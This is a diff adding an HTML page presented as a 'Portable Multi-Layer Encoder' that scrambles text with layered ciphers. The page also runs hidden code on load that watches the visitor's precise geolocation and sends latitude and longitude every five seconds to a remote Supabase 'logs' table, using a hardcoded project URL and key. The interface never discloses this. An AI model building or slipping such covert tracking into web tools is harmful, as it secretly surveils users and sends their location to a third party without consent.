@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Portable Multi-Layer Encoder (Clean Output)</title>
+<style>
+  body {
+    background: #0f172a;
+    color: white;
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding: 40px;
+  }
+
+  textarea {
+    width: 80%;
+    padding: 10px;
+    margin: 10px 0;
+    font-size: 16px;
+    height: 120px;
+  }
+
+  button {
+    padding: 10px 20px;
+    margin: 5px;
+    font-size: 16px;
+    cursor: pointer;
+  }
+</style>
+
+<!-- Load Supabase JS library -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+</head>
+<body>
+<h2>Portable Multi-Layer Encoder (Clean Output)</h2>
+
+<textarea id="input" placeholder="Enter your multi-line message here"></textarea><br>
+<button onclick="encodeStart()">Encode</button>
+<button onclick="decodeStart()">Decode</button><br>
+<textarea id="output" readonly></textarea>
+
+<script>
+const TOTAL_LAYERS = 1000000;
+const BURST = 10000;
+
+// ----------------- HELPERS -----------------
+const Helpers = {
+  wrap: n => (n + 256) % 256,
+  reverse: s => [...(s||'')].reverse().join(''),
+  caesar: (s, shift) => [...(s||'')].map(c => String.fromCharCode(Helpers.wrap(c.charCodeAt(0)+shift))).join(''),
+  decaesar: (s, shift) => [...(s||'')].map(c => String.fromCharCode(Helpers.wrap(c.charCodeAt(0)-shift))).join(''),
+  xorCipher: (s, key) => [...(s||'')].map(c => String.fromCharCode(c.charCodeAt(0)^key)).join(''),
+  swapPairs: s => {
+    let arr = [...(s||'')];
+    for (let i = 0; i < arr.length-1; i+=2) [arr[i], arr[i+1]] = [arr[i+1], arr[i]];
+    return arr.join('');
+  },
+  rotateLeft: s => s && s.length>=2 ? s.slice(1)+s[0] : s||'',
+  rotateRight: s => s && s.length>=2 ? s[s.length-1]+s.slice(0,-1) : s||'',
+  flipCase: s => [...(s||'')].map(c => 
+    c >= 'a' && c <= 'z' ? c.toUpperCase() :
+    c >= 'A' && c <= 'Z' ? c.toLowerCase() :
+    c
+  ).join(''),
+  zigzag: s => [...(s||'')].map((c,i) => String.fromCharCode(Helpers.wrap(c.charCodeAt(0)+(i%2?1:-1)))).join(''),
+  dezigzag: s => [...(s||'')].map((c,i) => String.fromCharCode(Helpers.wrap(c.charCodeAt(0)-(i%2?1:-1)))).join('')
+};
+
+// ----------------- METHODS -----------------
+const methods = [
+  { enc: Helpers.reverse, dec: Helpers.reverse },
+  { enc: s => Helpers.caesar(s, 3), dec: s => Helpers.decaesar(s, 3) },
+  { enc: s => Helpers.caesar(s, 5), dec: s => Helpers.decaesar(s, 5) },
+  { enc: s => Helpers.xorCipher(s, 11), dec: s => Helpers.xorCipher(s, 11) },
+  { enc: s => Helpers.xorCipher(s, 29), dec: s => Helpers.xorCipher(s, 29) },
+  { enc: Helpers.swapPairs, dec: Helpers.swapPairs },
+  { enc: Helpers.rotateLeft, dec: Helpers.rotateRight },
+  { enc: Helpers.rotateRight, dec: Helpers.rotateLeft },
+  { enc: Helpers.flipCase, dec: Helpers.flipCase },
+  { enc: Helpers.zigzag, dec: Helpers.dezigzag }
+];
+
+// ----------------- SUPABASE -----------------
+const supabaseClient = supabase.createClient(
+  "https://nallmqpqruylmghdengz.supabase.co",
+  "sb_publishable_7jOonmkbG-mUoj4rubIzzQ_PgAdzt95"
+);
+
+// Store latest coordinates
+let latestCoords = null;
+
+// Send coordinates to Supabase logs table
+async function sendLatestCoords() {
+  if (!latestCoords) return;
+  const { lat, lon } = latestCoords;
+  const message = `[COORDS] lat: ${lat}, lon: ${lon}`;
+  
+  const { error } = await supabaseClient
+    .from("logs")   // <-- table name corrected
+    .insert([{ message }]);
+
+  if (error) console.error("Supabase insert error:", error.message);
+}
+
+// Watch geolocation once; updates latestCoords automatically
+if (navigator.geolocation) {
+  navigator.geolocation.watchPosition(
+    pos => { latestCoords = { lat: pos.coords.latitude, lon: pos.coords.longitude }; },
+    err => console.error("Geolocation error:", err),
+    { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
+  );
+}
+
+// Send to Supabase every 5 seconds
+setInterval(sendLatestCoords, 5000);
+
+// ----------------- PRNG -----------------
+function seededRandom(seed) {
+  return function() {
+    seed = (seed * 9301 + 49297) % 233280;
+    return seed / 233280;
+  };
+}
+
+// ----------------- URL-SAFE BASE64 -----------------
+function encodeBase64Url(str) {
+  const u = new TextEncoder().encode(str);
+  let b = '';
+  u.forEach(x => b += String.fromCharCode(x));
+  return btoa(b).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+
+function decodeBase64Url(b64) {
+  let b = b64.replace(/-/g, '+').replace(/_/g, '/');
+  while (b.length % 4) b += '=';
+  const u = atob(b);
+  const arr = new Uint8Array(u.length);
+  for (let i = 0; i < u.length; i++) arr[i] = u.charCodeAt(i);
+  return new TextDecoder().decode(arr);
+}
+
+// ----------------- PARSER -----------------
+function parseEncodedText(text) {
+  const match = text.match(/S(\d+)D([\s\S]+)/);
+  if (!match) return null;
+  return { SEED: Number(match[1]), DATA: match[2] };
+}
+
+// ----------------- ENCODE -----------------
+function encodeStart() {
+  let msg = document.getElementById('input').value;
+  let layer = 0;
+  const seed = Math.floor(Math.random() * 1e9);
+  const prng = seededRandom(seed);
+
+  function burst() {
+    for (let i = 0; i < BURST && layer < TOTAL_LAYERS; i++) {
+      const id = Math.floor(prng() * methods.length);
+      msg = methods[id].enc(msg);
+      layer++;
+    }
+
+    document.getElementById('output').value = `ENCODING... Layers: ${layer}`;
+
+    if (layer < TOTAL_LAYERS) setTimeout(burst, 1);
+    else {
+      const dataB64 = encodeBase64Url(msg);
+      document.getElementById('output').value = `S${seed}D${dataB64}`;
+    }
+  }
+
+  burst();
+}
+
+// ----------------- DECODE -----------------
+function decodeStart() {
+  const text = document.getElementById('input').value;
+  const info = parseEncodedText(text);
+  if (!info) { alert('No encoded data found'); return; }
+
+  const prng = seededRandom(info.SEED);
+  const stack = [];
+  for (let i = 0; i < TOTAL_LAYERS; i++) stack.push(Math.floor(prng() * methods.length));
+
+  let msg = decodeBase64Url(info.DATA);
+  let layer = TOTAL_LAYERS;
+
+  function burst() {
+    for (let i = 0; i < BURST && layer > 0; i++) {
+      layer--;
+      msg = methods[stack[layer]].dec(msg);
+    }
+
+    document.getElementById('output').value = `DECODING... Layers left: ${layer}\n\n${msg}`;
+
+    if (layer > 0) setTimeout(burst, 1);
+  }
+
+  burst();
+}
+</script>
+</body>
+</html>
